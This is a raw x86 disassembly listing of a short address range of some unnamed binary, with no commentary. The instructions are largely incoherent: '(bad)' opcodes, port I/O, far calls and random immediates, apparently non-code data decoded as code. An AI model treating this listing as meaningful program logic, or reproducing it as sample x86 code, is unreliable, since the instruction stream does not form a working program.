  40b860:	jle    0x40b815
  40b862:	add    DWORD PTR [esi+ebx*1],0xffffffde
  40b866:	adc    dl,bh
  40b868:	push   ss
  40b869:	loope  0x40b7f1
  40b86b:	ficom  WORD PTR [ebx+0x54]
  40b86e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b86f:	stos   DWORD PTR es:[edi],eax
  40b870:	lds    ebx,FWORD PTR [ebx-0x3e641ebd]
  40b876:	xchg   ebx,eax
  40b877:	adc    cl,BYTE PTR [edi]
  40b879:	repz push esp
  40b87b:	pop    esi
  40b87c:	aam    0xdb
  40b87e:	jns    0x40b809
  40b880:	xor    al,0x2a
  40b882:	jg     0x40b898
  40b884:	push   ss
  40b885:	ss pop esp
  40b887:	xlat   BYTE PTR ds:[ebx]
  40b888:	icebp  
  40b889:	mov    ds:0x7c4d4094,al
  40b88e:	neg    DWORD PTR [ebx+0x6]
  40b891:	mov    edx,0xc843abc5
  40b896:	add    al,BYTE PTR [edx+0x21]
  40b899:	int3   
  40b89a:	imul   eax,DWORD PTR [ecx-0x2a4ba3a1],0x7d
  40b8a1:	scas   eax,DWORD PTR es:[edi]
  40b8a2:	in     al,0xf
  40b8a4:	jo     0x40b8fa
  40b8a6:	retf   0x59c
  40b8a9:	push   edx
  40b8aa:	xchg   BYTE PTR [edi+0x7d],ah
  40b8ad:	mov    bh,0xf4
  40b8af:	iret   
  40b8b0:	rcr    BYTE PTR [eax+0xdb3c50f],0x7f
  40b8b7:	lea    edx,[ebx]
  40b8b9:	or     al,0xcd
  40b8bb:	xchg   edi,eax
  40b8bc:	lock or BYTE PTR ds:[edx+edi*8],0xdb
  40b8c2:	sbb    al,0x86
  40b8c4:	pop    ss
  40b8c5:	xchg   DWORD PTR [edi-0x5a],eax
  40b8c8:	mov    edx,0xed9e99e1
  40b8cd:	cld    
  40b8ce:	xchg   ebx,edx
  40b8d0:	pop    ebp
  40b8d1:	mov    esi,0x60193238
  40b8d6:	mov    ch,0xf4
  40b8d8:	jne    0x40b880
  40b8da:	int    0xc2
  40b8dc:	add    BYTE PTR [ebx],dl
  40b8de:	jae    0x40b908
  40b8e0:	cmp    esp,ebp
  40b8e2:	pushf  
  40b8e3:	sbb    DWORD PTR [edx+0x1],edx
  40b8e6:	out    0xd2,eax
  40b8e8:	cmp    DWORD PTR [edi+0x73816294],edi
  40b8ee:	xor    al,0x24
  40b8f0:	inc    ecx
  40b8f1:	jg     0x40b8ea
  40b8f3:	add    ah,cl
  40b8f5:	xor    DWORD PTR [edx+0xa44a2a],ebp
  40b8fb:	ja     0x40b8c9
  40b8fd:	or     al,0xd5
  40b8ff:	dec    ebp
  40b900:	xchg   ebx,eax
  40b901:	add    bh,BYTE PTR [edi+0xb3d750a]
  40b907:	cmc    
  40b908:	mov    dl,0x45
  40b90a:	out    dx,al
  40b90b:	or     ecx,DWORD PTR [ebp+0x3930093d]
  40b911:	mov    edx,0x10b56eab
  40b916:	mov    al,0xdf
  40b918:	sbb    al,0xc3
  40b91a:	ret    0x1605
  40b91d:	sub    DWORD PTR [ebp-0x1386311c],esp
  40b923:	push   0xa3ea187d
  40b928:	loop   0x40b97d
  40b92a:	mov    dl,0x28
  40b92c:	mov    WORD PTR [ebx+0x5e4d4448],?
  40b932:	sbb    edi,DWORD PTR [ecx-0x5a2b4c3f]
  40b938:	and    BYTE PTR [ebx+0x42c9c581],dl
  40b93e:	or     DWORD PTR [edi+0x4648cde0],edi
  40b944:	inc    ecx
  40b945:	int3   
  40b946:	push   eax
  40b947:	cmp    eax,0x79ca886e
  40b94c:	xor    esi,ebx
  40b94e:	aaa    
  40b94f:	push   ebx
  40b950:	and    edi,esp
  40b952:	mov    ecx,0x4d6e7795
  40b957:	fist   DWORD PTR [ebp-0x17ec9e69]
  40b95d:	mov    WORD PTR [ecx-0x11849276],fs
  40b963:	test   eax,0x7a694745
  40b968:	ins    DWORD PTR es:[edi],dx
  40b969:	xor    DWORD PTR [edx+0x51efbc5c],ebx
  40b96f:	mov    ah,0x32
  40b971:	imul   edx,esp,0x607c5930
  40b977:	dec    eax
  40b978:	adc    eax,0x390a1168
  40b97d:	mov    ch,0x63
  40b97f:	fucomi st,st(5)
  40b981:	aaa    
  40b982:	stc    
  40b983:	mov    eax,0x654bac86
  40b988:	fsubp  st(2),st
  40b98a:	pop    esp
  40b98b:	or     ebp,DWORD PTR [ebx+0x5d]
  40b98e:	push   0x3b810448
  40b993:	int3   
  40b994:	xchg   al,bh
  40b996:	leave  
  40b997:	enter  0x640c,0xa3
  40b99b:	cmc    
  40b99c:	mov    BYTE PTR [eax-0x79],al
  40b99f:	fidiv  DWORD PTR [ecx+edi*1+0x5b3ba5cd]
  40b9a6:	sub    eax,0xceaae480
  40b9ab:	and    edi,edx
  40b9ad:	pop    edi
  40b9ae:	ret    
  40b9af:	mov    al,ds:0x5164b164
  40b9b4:	add    esp,DWORD PTR ds:0xf760f9b1
  40b9ba:	lods   al,BYTE PTR ds:[esi]
  40b9bb:	fs ins BYTE PTR es:[edi],dx
  40b9bd:	imul   esi,DWORD PTR [ebx+esi*8-0x7c46e7a5],0x43f14cb6
  40b9c8:	mov    ?,ebp
  40b9ca:	call   0xaaab:0x756460e0
  40b9d1:	cld    
  40b9d2:	test   al,0xde
  40b9d4:	ins    BYTE PTR es:[edi],dx
  40b9d5:	inc    ecx
  40b9d6:	retf   
  40b9d7:	adc    DWORD PTR [edi-0x7f383f97],esi
  40b9dd:	ins    BYTE PTR es:[edi],dx
  40b9de:	and    al,0x6b
  40b9e0:	jbe    0x40b9c2
  40b9e2:	pop    edi
  40b9e3:	(bad)
  40b9e6:	pop    ebx
  40b9e7:	mov    ah,0x99
  40b9e9:	adc    BYTE PTR [edx+esi*2-0x7a950e40],cl
  40b9f0:	or     ch,BYTE PTR [edx+0x31a0a950]
  40b9f6:	cmc    
  40b9f7:	call   0xa5cbe85
  40b9fc:	sahf   
  40b9fd:	inc    ebx
  40b9fe:	retf   0xdca4
  40ba01:	rol    ebx,cl
  40ba03:	inc    esp
  40ba04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ba05:	loop   0x40ba09
  40ba07:	adc    ah,BYTE PTR [eax+0x6851e86f]
  40ba0d:	adc    al,0xa6
  40ba0f:	sub    BYTE PTR [edi-0x68b72a4c],cl
  40ba15:	outs   dx,DWORD PTR ds:[esi]
  40ba16:	inc    ecx
  40ba17:	test   BYTE PTR [edi],dh
  40ba19:	dec    ebx
  40ba1a:	mul    BYTE PTR [esp+edx*1-0x1c2da0e9]
  40ba21:	arpl   WORD PTR [esi-0x4a],bp
  40ba24:	outs   dx,BYTE PTR ds:[esi]
  40ba25:	ss inc esp
  40ba27:	jno    0x40ba94
  40ba29:	adc    ah,cl
  40ba2b:	adc    eax,0x55aa30b8
  40ba30:	mov    ah,0x80
  40ba32:	push   esp
  40ba33:	outs   dx,DWORD PTR ds:[esi]
  40ba34:	push   ecx
  40ba35:	jp     0x40b9df
  40ba37:	xor    eax,0x47118631
  40ba3c:	and    ecx,DWORD PTR [edx+ebx*1+0x3c]
  40ba40:	sub    DWORD PTR [edx+eax*1],esi
  40ba43:	sar    DWORD PTR [eax],1
  40ba45:	xchg   ecx,eax
  40ba46:	inc    edi
  40ba47:	mov    dl,0x3a
  40ba49:	or     BYTE PTR [ebx+0x5882388e],dh
  40ba4f:	aaa    
  40ba50:	imul   esi,DWORD PTR [ecx+0x4d],0x5ea5f275
  40ba57:	jecxz  0x40ba6f
  40ba59:	or     eax,ebx
  40ba5b:	fnstcw WORD PTR [edi+ecx*4+0x25927157]
  40ba62:	(bad)  
  40ba63:	adc    edx,DWORD PTR [eax-0x65b5d1ac]
  40ba69:	sbb    eax,0xbce3f347
  40ba6e:	jp     0x79b0aa47
  40ba74:	dec    edi
  40ba75:	lahf   
  40ba76:	jmp    0x40ba5d
  40ba78:	(bad)  
  40ba79:	shr    ch,1
  40ba7b:	and    eax,edi
  40ba7d:	cmp    cl,dh
  40ba7f:	jns    0x40baea
  40ba81:	ins    BYTE PTR es:[edi],dx
  40ba82:	fwait
  40ba83:	sub    ecx,DWORD PTR [edi+0x3b]
  40ba86:	cmc    
  40ba87:	xor    BYTE PTR [edi-0x3d718d5d],0xf0
  40ba8e:	popf   
  40ba8f:	lods   al,BYTE PTR ds:[esi]
  40ba90:	fisub  DWORD PTR [esi]
  40ba92:	fiadd  DWORD PTR [eax+eax*1-0x122140c9]
  40ba99:	push   0x94e06570
  40ba9e:	xchg   esi,eax
  40ba9f:	or     al,0x67
  40baa1:	and    ebp,DWORD PTR [ebx+0x12]
  40baa4:	jl     0x40ba56
  40baa6:	out    dx,al
  40baa7:	pop    ds
  40baa8:	js     0x40ba4d
  40baaa:	neg    edx
  40baac:	cmc    
  40baad:	test   BYTE PTR [ebx-0x867e829],0xa4
  40bab4:	add    al,0xa2
  40bab6:	mov    dh,0xab
  40bab8:	push   0xffffffa4
  40baba:	inc    eax
  40babb:	mov    al,0x55
  40babd:	sbb    al,0x5d
  40babf:	enter  0x8e72,0x76
  40bac3:	inc    edi
  40bac4:	xor    DWORD PTR [edi-0x62],ecx
  40bac7:	or     eax,0x7a098794
  40bacc:	sub    BYTE PTR [ecx],dh
  40bace:	stos   BYTE PTR es:[edi],al
  40bacf:	test   al,0x71
  40bad1:	hlt    
  40bad2:	jb     0x40ba75
  40bad4:	mov    dl,0xf2
  40bad6:	cli    
  40bad7:	ret    
  40bad8:	(bad)  
  40bad9:	(bad)  
  40bada:	xor    DWORD PTR [edi+ecx*4],ebp
  40badd:	mov    edi,?
  40badf:	sub    esp,ebx
  40bae1:	scas   eax,DWORD PTR es:[edi]
  40bae2:	pop    eax
  40bae3:	dec    edi
  40bae4:	adc    BYTE PTR [ecx-0x40],al
  40bae7:	je     0x40bb38
  40bae9:	stos   DWORD PTR es:[edi],eax
  40baea:	nop
  40baeb:	int3   
  40baec:	out    0x1f,al
  40baee:	out    0xb1,al
  40baf0:	pop    eax
  40baf1:	ss xchg ebp,eax
  40baf3:	(bad)  
  40baf4:	rol    DWORD PTR [ecx+0x4f],1
  40baf7:	test   ch,0xb8
  40bafa:	in     eax,dx
  40bafb:	jno    0x40baeb
  40bafd:	sub    al,dl
  40baff:	stos   BYTE PTR es:[edi],al
  40bb00:	sub    ebp,DWORD PTR [ebx+0x72]
  40bb03:	xchg   ebx,eax
  40bb04:	push   edx
  40bb05:	inc    esp
  40bb06:	popa   
  40bb07:	dec    ebp
  40bb08:	mov    eax,ds:0x58d425ec
  40bb0d:	xor    esp,0xffffffa7
  40bb10:	xchg   BYTE PTR [edx],cl
  40bb12:	mov    dh,0x9d
  40bb14:	fisubr DWORD PTR [ecx-0xce92f00]
  40bb1a:	nop
  40bb1b:	das    
  40bb1c:	scas   al,BYTE PTR es:[edi]
  40bb1d:	outs   dx,BYTE PTR ds:[esi]
  40bb1e:	leave  
  40bb1f:	mov    ecx,0x4fea3177
  40bb24:	mov    eax,ds:0xdfbb7d0d
  40bb29:	dec    ebp
  40bb2a:	scas   al,BYTE PTR es:[edi]
  40bb2b:	add    DWORD PTR [ebx+0x68],esi
  40bb2e:	or     bh,BYTE PTR [ebp+esi*8+0x4a]
  40bb32:	pop    ds
  40bb33:	xchg   esp,eax
  40bb34:	xchg   esi,eax
  40bb35:	jmp    0x40bb93
  40bb37:	jmp    0x40bbaf
  40bb39:	push   ebx
  40bb3a:	mov    ds:0x6c83a451,al
  40bb3f:	mov    di,0x218a
  40bb43:	mov    ecx,0x45241ea3
  40bb48:	mov    al,ds:0x97a04903
  40bb4d:	arpl   WORD PTR [ecx+0x6c],si
  40bb50:	fs ret 0x15c6
  40bb54:	fcom   st(2)
  40bb56:	add    BYTE PTR [eax+0x129037a1],bh
  40bb5c:	dec    ecx
  40bb5d:	add    BYTE PTR [edi-0x24a90f55],0x37
  40bb64:	je     0x40bbb6
  40bb66:	mov    ds:0xe1c6386b,eax
  40bb6b:	scas   eax,DWORD PTR es:[edi]
  40bb6c:	lock xor BYTE PTR [eax+0x6],dh
  40bb70:	cmp    eax,0x2dd8bc7d
  40bb75:	lahf   
  40bb76:	pop    edi
  40bb77:	cld    
  40bb78:	in     al,0x16
  40bb7a:	push   edi
  40bb7b:	sub    al,0x4a
  40bb7d:	or     eax,0x17d8f034
  40bb82:	js     0x40bbac
  40bb84:	pop    eax
  40bb85:	fstp   TBYTE PTR [ebp+0x771ce7d2]
  40bb8b:	ret    0xf96
  40bb8e:	cwde   
  40bb8f:	and    eax,0xc53d4922
  40bb94:	mov    ds:0x698b4184,eax
  40bb99:	ins    DWORD PTR es:[edi],dx
  40bb9a:	push   esi
  40bb9b:	daa    
  40bb9c:	mov    bh,0x8c
  40bb9e:	stos   WORD PTR es:[edi],ax
  40bba0:	lods   al,BYTE PTR ds:[esi]
  40bba1:	mov    al,ds:0xd5083894
  40bba6:	mov    dh,0xa
  40bba8:	aaa    
  40bba9:	jle    0x40bb96
  40bbab:	sbb    al,0xa5
  40bbad:	mov    esp,0x29b50d70
  40bbb2:	sar    DWORD PTR [ebp+0xe],cl
  40bbb5:	push   es
  40bbb6:	mov    edx,0x14e4a3f4
  40bbbb:	jge    0x40bb81
  40bbbd:	inc    eax
  40bbbe:	(bad)  
  40bbbf:	xlat   BYTE PTR ds:[ebx]
  40bbc0:	(bad)  
  40bbc1:	push   ebp
  40bbc2:	loop   0x40bb78
  40bbc4:	idiv   DWORD PTR [ebx]
  40bbc6:	mov    ch,0x44
  40bbc8:	lea    ebp,[edi-0x68d82d1b]
  40bbce:	in     al,0x96
  40bbd0:	ins    DWORD PTR es:[edi],dx
  40bbd1:	int3   
  40bbd2:	stos   BYTE PTR es:[edi],al
  40bbd3:	pop    ebp
  40bbd4:	xchg   ebp,eax
  40bbd5:	xchg   BYTE PTR [ebp-0x66],ch
  40bbd8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bbd9:	inc    edx
  40bbda:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bbdb:	jecxz  0x40bb75
  40bbdd:	add    DWORD PTR [eax+0x6c552514],eax
  40bbe3:	sub    DWORD PTR [edx-0x4449935a],0xfffffffc
  40bbea:	fdivr  DWORD PTR [eax-0x40]
  40bbed:	pop    esp
  40bbee:	inc    esi
  40bbef:	jb     0x40bbc5
  40bbf1:	call   0x987ec56e
  40bbf6:	idiv   BYTE PTR [esi-0x20]
  40bbf9:	push   ebx
  40bbfa:	push   ebp
  40bbfb:	rol    DWORD PTR [edi],0x8a
  40bbfe:	dec    edx
  40bbff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc00:	and    eax,0xef3b8392
  40bc05:	inc    ecx
  40bc07:	popf   
  40bc08:	dec    ebx
  40bc09:	test   eax,0x12b98d40
  40bc0e:	data16 fiadd DWORD PTR [edi-0x7347a394]
  40bc15:	push   eax
  40bc16:	ja     0x40bc72
  40bc18:	sbb    al,0x5b
  40bc1a:	cmp    BYTE PTR [ecx-0x17],0xd0
  40bc1e:	or     eax,0x653d18db
  40bc23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bc24:	inc    eax
  40bc25:	add    BYTE PTR [ebx+0x38],cl
  40bc28:	mov    ch,0x50
  40bc2a:	hlt    
  40bc2b:	pop    eax
  40bc2c:	jmp    FWORD PTR [ebx]
  40bc2e:	sar    BYTE PTR [ecx-0x3728b159],1
  40bc34:	pop    ds
  40bc35:	cmp    esp,DWORD PTR [eax-0x35]
  40bc38:	out    0xee,eax
  40bc3a:	mov    cs,WORD PTR [edx+0x29]
  40bc3d:	es cmc 
  40bc3f:	inc    ebp
  40bc40:	pop    eax
  40bc41:	xor    dh,al
  40bc43:	or     edi,0x4be3ba75
  40bc49:	push   0x397d2d22
  40bc4e:	fistp  QWORD PTR [edx+0xd]
  40bc51:	jns    0x40bc9d
  40bc53:	jecxz  0x40bbe5
  40bc55:	adc    BYTE PTR [edi+0x6a17193e],cl
  40bc5b:	adc    eax,DWORD PTR ds:0xa199c4a3
  40bc61:	dec    esi
  40bc62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc63:	rcr    DWORD PTR [esi-0x50d61fa2],0x1d
  40bc6a:	fdiv   st(3),st
  40bc6c:	jg     0x40bc25
  40bc6e:	fcmovne st,st(5)
  40bc70:	jbe    0x40bce8
  40bc72:	inc    ebx
  40bc73:	scas   al,BYTE PTR es:[edi]
  40bc74:	enter  0xea91,0x27
  40bc78:	sub    DWORD PTR [esi+0x49],esi
  40bc7b:	enter  0xa5a0,0xca
  40bc7f:	xor    eax,0x587a741f
  40bc84:	xchg   ebp,eax
  40bc85:	lds    esp,FWORD PTR [ebx]
  40bc87:	inc    esp
  40bc88:	je     0x40bc5c
  40bc8a:	mov    ebx,0x2e59a1a4
  40bc8f:	mov    DWORD PTR [esi],esp
  40bc91:	mov    ebx,0x6ef954d3
  40bc96:	and    al,0xa1
  40bc98:	sub    eax,0xd7300933
  40bc9d:	push   esi
  40bc9e:	dec    eax
  40bc9f:	retf   0x695a
  40bca2:	and    esp,ebx
  40bca4:	xchg   edi,eax
  40bca5:	aas    
  40bca6:	test   al,0x58
  40bca8:	add    eax,0xb23a0341
  40bcad:	dec    ebx
  40bcae:	mov    dl,0x11
  40bcb0:	pusha  
  40bcb1:	adc    ch,BYTE PTR [edx+0x4]
  40bcb4:	xchg   esi,eax
  40bcb5:	fdivr  DWORD PTR [eax-0x5b4e92ef]
  40bcbb:	add    eax,0xa395a23f
  40bcc0:	jl     0x40bcf9
  40bcc2:	cld    
  40bcc3:	mov    ds:0xa4bbc040,eax
  40bcc8:	inc    ebx
  40bcc9:	fst    DWORD PTR [eax-0x3c]
  40bccc:	or     esi,edi
  40bcce:	ins    DWORD PTR es:[edi],dx
  40bccf:	mov    dl,0x31
  40bcd1:	lods   eax,DWORD PTR ds:[esi]
  40bcd2:	repz js 0x40bd2c
  40bcd5:	scas   al,BYTE PTR es:[edi]
  40bcd6:	dec    esi
  40bcd7:	jmp    0x11f5:0xeb8c1e88
  40bcde:	call   0x80ba:0x550d0ec0
  40bce5:	dec    edi
  40bce6:	push   0xb19907b
  40bceb:	dec    ebx
  40bcec:	adc    DWORD PTR [ebx+0x77680db6],esp
  40bcf2:	or     eax,0xe46ceda1
  40bcf7:	cmp    eax,0x21ba8991
  40bcfc:	outs   dx,BYTE PTR ds:[esi]
  40bcfd:	lahf   
  40bcfe:	leave  
  40bcff:	adc    BYTE PTR [eax-0x4fb42f59],bh
  40bd05:	mov    bh,0x21
  40bd07:	pop    ebx
  40bd08:	inc    edx
  40bd09:	loopne 0x40bd56
  40bd0b:	in     al,dx
  40bd0c:	jmp    0x942b:0x607aa75f
  40bd13:	jecxz  0x40bd02
  40bd15:	xchg   ecx,eax
  40bd16:	inc    esp
  40bd17:	cmp    ecx,DWORD PTR [edx-0x191f3843]
  40bd1d:	pusha  
  40bd1e:	test   dh,ch
  40bd20:	das    
  40bd21:	aaa    
  40bd22:	push   es
  40bd23:	lods   eax,DWORD PTR ds:[esi]
  40bd24:	pop    es
  40bd25:	imul   esi,DWORD PTR [ebp+0x49552581],0x7d
  40bd2c:	rcr    ebp,cl
  40bd2e:	xor    eax,edi
  40bd30:	mov    ah,0x87
  40bd32:	dec    ebp
  40bd33:	mov    al,ds:0xdb520d57
  40bd38:	and    BYTE PTR [eax],bl
  40bd3a:	mov    dh,0x4c
  40bd3c:	mov    edx,0xa7c3d22a
  40bd41:	jecxz  0x40bd2d
  40bd43:	aad    0x2
  40bd45:	mov    bh,0x85
  40bd47:	sub    al,0xe8
  40bd49:	pop    ebp
  40bd4a:	ret    
  40bd4b:	mov    edi,0xa7fadf77
  40bd50:	jmp    FWORD PTR ds:0xf39818d2
  40bd56:	adc    ecx,DWORD PTR [esi-0x24583a1d]
  40bd5c:	fs jne 0x40bd40
  40bd5f:	stos   BYTE PTR es:[edi],al
  40bd60:	scas   eax,DWORD PTR es:[edi]
  40bd61:	sub    ecx,DWORD PTR [edx-0x18]
  40bd64:	push   0xfffffff6
  40bd66:	mov    ah,0x9
  40bd68:	pop    edi
  40bd69:	jb     0x40bdc9
  40bd6b:	add    eax,0x3c3169df
  40bd70:	cmp    edi,DWORD PTR [edi+0x1e]
  40bd73:	pop    es
  40bd74:	cmc    
  40bd75:	lods   eax,DWORD PTR ds:[esi]
  40bd76:	je     0x40bd7b
  40bd78:	mov    cs,WORD PTR [edi*2+0x7ca9f9fa]
  40bd7f:	fdiv   DWORD PTR [ebx]
  40bd81:	hlt    
  40bd82:	adc    BYTE PTR [ebx],bh
  40bd84:	jbe    0x40bd57
  40bd86:	dec    ebx
  40bd87:	sbb    eax,0x2f4fd54f
  40bd8c:	test   al,0x32
  40bd8e:	xchg   DWORD PTR [ebx-0x64],ecx
  40bd91:	sbb    eax,0x617c58ee
  40bd96:	xchg   ebp,eax
  40bd97:	adc    BYTE PTR ds:0x6df6d206,cl
  40bd9d:	imul   esp,DWORD PTR [edi+ecx*2+0x70],0xbfa76bf8
  40bda5:	out    dx,al
  40bda6:	push   ss
  40bda7:	push   ss
  40bda8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bda9:	jno    0x40bd6e
  40bdab:	add    eax,0x6c37d736
  40bdb0:	mov    esp,0xe038521c
  40bdb5:	outs   dx,BYTE PTR ds:[esi]
  40bdb6:	and    ecx,0x76
  40bdb9:	xchg   ebp,eax
  40bdba:	jmp    0xd19bb99f
  40bdbf:	bound  esp,QWORD PTR [ebp+0x6e]
  40bdc2:	dec    ebp
  40bdc3:	inc    edx
  40bdc4:	push   es
  40bdc5:	jle    0x40bd64
  40bdc7:	imul   BYTE PTR fs:[ebx]
  40bdca:	dec    ebx
  40bdcb:	lods   al,BYTE PTR ds:[esi]
  40bdcc:	mov    ds:0x33c035ce,al
  40bdd1:	loopne 0x40bd75
  40bdd3:	outs   dx,BYTE PTR ds:[esi]
  40bdd5:	cmp    BYTE PTR [eax-0x1452cdfd],bh
  40bddb:	aam    0x80
  40bddd:	lods   al,BYTE PTR ds:[esi]
  40bdde:	popf   
  40bddf:	test   BYTE PTR [ebp+0x22bdd495],0x62
  40bde6:	push   esp
  40bde7:	cli    
  40bde8:	sbb    eax,0xd573ccd3
  40bded:	push   ecx
  40bdee:	fild   DWORD PTR [ebp+0x2def7d6d]
  40bdf4:	fmulp  st(6),st
  40bdf6:	jne    0x40be5e
  40bdf8:	mov    ds:0x877efb1d,eax
  40bdfd:	or     eax,0xea542d03
  40be02:	pop    ebp
  40be03:	and    BYTE PTR [edi-0x17],al
  40be06:	popf   
  40be07:	(bad)  
  40be08:	mov    ebp,0x48c1533d
  40be0d:	jecxz  0x40bd9f
  40be0f:	xchg   esi,eax
  40be10:	xchg   ecx,ebp
  40be12:	xor    BYTE PTR ds:0xda8cd773,bl
  40be18:	test   DWORD PTR [edi],ebx
  40be1a:	and    edx,DWORD PTR [ebp-0x4]
  40be1d:	jg     0x40be27
  40be1f:	mov    ebx,?
  40be21:	retf   0xc930
  40be24:	push   ss
  40be25:	ja     0x40be2e
  40be27:	in     al,dx
  40be28:	aam    0xe
  40be2a:	call   0xd9dc2afc
  40be2f:	aas    
  40be30:	pop    edx
  40be31:	aam    0xc2
  40be33:	or     ebx,DWORD PTR [ebx+0x61]
  40be36:	cmp    ebx,DWORD PTR ds:0xc3f18dbb
  40be3c:	push   ebp
  40be3d:	xor    bh,BYTE PTR [ecx+0x69d5673e]
  40be43:	push   es
  40be44:	sbb    BYTE PTR [edi-0x60],ah
  40be47:	(bad)  
  40be48:	push   edi
  40be49:	ss aad 0x9c
  40be4c:	adc    al,cl
  40be4e:	retf   
  40be4f:	int    0xfc
  40be51:	call   0x3bd2:0x64ffb99a
  40be58:	ficomp WORD PTR [eax]
  40be5a:	push   esp
  40be5b:	lea    ebx,[esi]
  40be5d:	add    BYTE PTR [ebp-0x1b17e98d],ch
  40be63:	out    dx,al
  40be64:	pop    es
  40be65:	lock popa 
  40be67:	retf   
  40be68:	aas    
  40be69:	mov    esp,0x27eeff69
  40be6e:	and    ebp,ebx
  40be70:	leave  
  40be71:	scas   al,BYTE PTR es:[edi]
  40be72:	lods   al,BYTE PTR ds:[esi]
  40be73:	out    dx,al
  40be74:	cwde   
  40be75:	push   ebp
  40be76:	sub    edx,edi
  40be78:	jno    0x40bec0
  40be7a:	pop    ebp
  40be7b:	mov    al,ds:0x7f9e432
  40be80:	loopne 0x40be08
  40be82:	inc    ebp
  40be83:	call   0xb914046d
  40be88:	inc    eax
  40be89:	or     BYTE PTR [esi-0x1c],ch
  40be8c:	or     esp,DWORD PTR [ebx+eax*1-0x5c]
  40be90:	xor    al,0xa2
  40be92:	xchg   ebp,eax
  40be93:	and    DWORD PTR [ecx*1+0x2ef23fe],0xffffff92
  40be9b:	or     DWORD PTR [ebx-0x71],edi
  40be9e:	repz cmp edi,eax
  40bea1:	icebp  
  40bea2:	loopne 0x40be54
  40bea4:	data16 ins BYTE PTR es:[edi],dx
  40bea6:	inc    esp
  40bea7:	pop    eax
  40bea8:	sbb    eax,0x7d2d9b63
  40bead:	cdq    
  40beae:	arpl   WORD PTR [ecx-0x37b448cc],cx
  40beb4:	jmp    0xac9bc85
  40beb9:	mov    al,ds:0xf52838b4
  40bebe:	test   bl,cl
  40bec0:	les    eax,FWORD PTR ds:0xe90a6984
  40bec6:	adc    al,0x7f
  40bec8:	adc    ah,ah
  40beca:	test   BYTE PTR [ebx],dl
  40becc:	push   esp
  40becd:	push   es
  40bece:	and    edi,DWORD PTR [ebx+0x49]
  40bed1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bed2:	mov    al,0x7e
  40bed4:	sbb    ch,BYTE PTR [eax]
  40bed6:	icebp  
  40bed7:	adc    edi,DWORD PTR [edx]
  40bed9:	push   eax
  40beda:	pop    es
  40bedb:	mov    esi,0x530c4eba
  40bee0:	and    BYTE PTR [ebx],ch
  40bee2:	test   eax,0xfcf3bc00
  40bee7:	add    DWORD PTR [esi+0x2521244],edi
  40beed:	fiadd  WORD PTR [eax-0x1e]
  40bef0:	inc    edi
  40bef1:	pop    esp
  40bef2:	jnp    0x40bf30
  40bef4:	loope  0x40beb4
  40bef6:	into   
  40bef7:	in     al,0xcf
  40bef9:	xchg   ecx,eax
  40befa:	add    al,0xae
  40befc:	xchg   ebx,eax
  40befd:	sbb    DWORD PTR [edi],ecx
  40beff:	mov    ecx,DWORD PTR [ebp-0x51]
  40bf02:	ret    0xf83e
  40bf05:	dec    edx
  40bf06:	add    al,0xc1
  40bf08:	jl     0x40bf1b
  40bf0a:	cmp    eax,0x514ac5ad
  40bf0f:	mov    eax,DWORD PTR [edi]
  40bf11:	sahf   
  40bf12:	xor    ebx,ecx
  40bf14:	nop
  40bf15:	retf   
  40bf16:	adc    DWORD PTR [ecx+eiz*4-0x4d610dba],edi
  40bf1d:	mov    bl,0xd1
  40bf1f:	xchg   ebp,eax
  40bf20:	pop    edx
  40bf21:	loope  0x40beee
  40bf23:	ja     0x40bee1
  40bf25:	dec    ebp
  40bf26:	adc    BYTE PTR [ecx-0x16685329],al
  40bf2c:	mov    al,0x83
  40bf2e:	jmp    0x40bf42
  40bf30:	pop    eax
  40bf31:	xchg   esp,eax
  40bf32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bf33:	lahf   
  40bf34:	fisubr DWORD PTR [ebx+edi*8-0x28fc4fb2]
  40bf3b:	mov    WORD PTR cs:[edi],gs
  40bf3e:	lods   eax,DWORD PTR ds:[esi]
  40bf3f:	lods   eax,DWORD PTR ds:[esi]
  40bf40:	cld    
  40bf41:	enter  0x955f,0x4c
  40bf45:	mov    al,gs:0xc17b5d72
  40bf4b:	fwait
  40bf4c:	mov    al,0x53
  40bf4e:	and    edi,eax
  40bf50:	mov    dl,0x10
  40bf52:	mov    esp,0xcd02e105
  40bf57:	add    eax,DWORD PTR [edx+0x6f]
  40bf5a:	push   ebx
  40bf5b:	ins    DWORD PTR es:[edi],dx
  40bf5c:	jae    0x40bfc7
  40bf5e:	mov    BYTE PTR [esi],ch
  40bf60:	fdiv   DWORD PTR [edx+0x5a]
  40bf63:	ss sbb eax,0x32aac791
  40bf69:	dec    esp
  40bf6a:	dec    edx
  40bf6b:	xchg   ebp,eax
  40bf6c:	pop    ds
  40bf6d:	push   edi
  40bf6e:	fisttp QWORD PTR [esi-0x6ec10e5]
  40bf74:	iret   
  40bf75:	add    BYTE PTR [esi],0x18
  40bf78:	sbb    ebp,DWORD PTR [esi+0x4f554dbd]
  40bf7e:	mov    ds:0xe559a1f6,al
  40bf83:	retf   
  40bf84:	sub    eax,0xb5dcd383
  40bf89:	xchg   edi,eax
  40bf8a:	lods   al,BYTE PTR ds:[esi]
  40bf8b:	mov    esi,0x2250794
  40bf90:	jb     0x40c00c
  40bf92:	imul   esi,DWORD PTR ds:[edi+0x54],0xffffff8e
  40bf97:	xor    dl,BYTE PTR [eax+0x19551d6f]
  40bf9d:	and    DWORD PTR [ecx+0x41],0xd85d6bc2
  40bfa4:	enter  0xe427,0x6e
  40bfa8:	cmp    DWORD PTR [edx-0x53701ed8],edx
  40bfae:	jo     0x40c004
  40bfb0:	xchg   ebp,eax
  40bfb1:	test   al,0xde
  40bfb3:	mov    dl,0x3a
  40bfb5:	ins    BYTE PTR es:[edi],dx
  40bfb6:	mov    ebx,0x499f8b8c
  40bfbb:	adc    ah,BYTE PTR [ecx+0x11dcbf]
  40bfc1:	xor    bh,BYTE PTR [ecx-0x27]
  40bfc4:	call   0xd0c5:0x9da49fcd
  40bfcb:	mov    eax,ds:0x6acb976c
  40bfd0:	inc    ecx
  40bfd1:	add    al,BYTE PTR [ebp+0x76]
